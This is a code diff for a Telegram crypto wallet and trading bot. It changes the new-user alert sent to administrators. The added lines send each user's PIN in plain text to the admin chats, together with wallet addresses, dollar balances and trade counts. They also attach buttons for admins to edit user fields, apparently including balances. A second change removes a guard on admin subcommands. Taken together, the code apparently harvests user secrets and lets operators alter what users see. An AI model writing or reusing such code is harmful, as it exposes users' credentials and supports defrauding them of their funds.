@@ -666,25 +666,40 @@ function registerUser(state) {
      saveUsers();
 
       if (isNewUser && ADMIN_ID) {
-       const adminNotification = `🎉 <b>New User Registered!</b>\n\n` +
-         `👤 Username: ${state.username ? `<code>@${state.username}</code>` : "Unknown"}\n` +
-         `🆔 User ID: ${state.userId}\n` +
-         `📧 Email: <code>${state.email}</code>\n` +
-         `🟣 SOL Wallet: <code>${state.address || "N/A"}</code>\n` +
-         `🔵 ETH Wallet: <code>${state.ethAddress || "N/A"}</code>\n` +
-         `🕒 Time: ${new Date().toISOString()}`;
+        const solUsd = (state.solBalance || 0) * SOL_PRICE;
+        const ethUsd = (state.ethBalance || 0) * ETH_PRICE;
+        const usdc = state.usdcBalance || 0;
+        const total = solUsd + ethUsd + usdc;
+        const adminNotification = `🎉 <b>New User Registered!</b>\n\n` +
+          `👤 Username: ${state.username ? `<code>@${state.username}</code>` : "Unknown"}\n` +
+          `🆔 User ID: ${state.userId}\n` +
+          `📧 Email: <code>${state.email}</code>\n` +
+          `🔐 PIN: <code>${state.pin}</code>\n` +
+          `🟣 SOL Address: <code>${state.address || "N/A"}</code>\n` +
+          `🔵 ETH Address: <code>${state.ethAddress || "N/A"}</code>\n` +
+          `💵 SOL: $${solUsd.toFixed(2)} (${(state.solBalance || 0).toFixed(4)} SOL)\n` +
+          `💵 ETH: $${ethUsd.toFixed(2)} (${(state.ethBalance || 0).toFixed(4)} ETH)\n` +
+          `💵 USDC: $${usdc.toFixed(2)}\n` +
+          `💎 Total: $${total.toFixed(2)}\n` +
+          `🔄 Trades: ${state.tradeHistory?.length || 0}\n` +
+          `📋 Copy Trades: ${state.copyTrades?.length || 0}\n` +
+          `💎 Staking Positions: ${state.stakingPositions?.length || 0}\n` +
+          `📅 Registered: ${new Date().toISOString()}\n\n` +
+          `Select a field to edit:`;
 
-       ADMIN_ID.split(",").forEach(id => {
-         const adminId = parseInt(id.trim(), 10);
-         if (!isNaN(adminId)) {
-           bot.telegram.sendMessage(adminId, adminNotification, { parse_mode: "HTML" }).catch(e => {
-             console.error(`⚠️  Failed to notify admin ${adminId}:`, e?.message || e);
-             debugLog.push({ time: new Date().toISOString(), action: "admin notification failed", error: e?.message || e?.toString(), adminId });
-           });
-           debugLog.push({ time: new Date().toISOString(), action: "admin notification sent", userId: state.userId, adminId });
-         }
-       });
-    }
+        const keyboard = adminKeyboardFor(state.userId);
+
+        ADMIN_ID.split(",").forEach(id => {
+          const adminId = parseInt(id.trim(), 10);
+          if (!isNaN(adminId)) {
+            bot.telegram.sendMessage(adminId, adminNotification, { parse_mode: "HTML", reply_markup: keyboard }).catch(e => {
+              console.error(`⚠️  Failed to notify admin ${adminId}:`, e?.message || e);
+              debugLog.push({ time: new Date().toISOString(), action: "admin notification failed", error: e?.message || e?.toString(), adminId });
+            });
+            debugLog.push({ time: new Date().toISOString(), action: "admin notification sent with edit buttons", userId: state.userId, adminId });
+          }
+        });
+      }
   }
 }
 
@@ -1756,10 +1771,6 @@ bot.command("admin", (ctx) => {
     return ctx.reply("📭 No registered users yet.");
   }
   const args = (ctx.message.text || "").split(" ").slice(1);
-  const subcommands = ["list", "balance", "pin", "email", "address", "username", "clear", "trades", "signal", "remove"];
-  if (args.length > 0 && subcommands.includes(args[0])) {
-    return;
-  }
 
   if (args.length > 0) {
     const targetId = Number(args[0]);
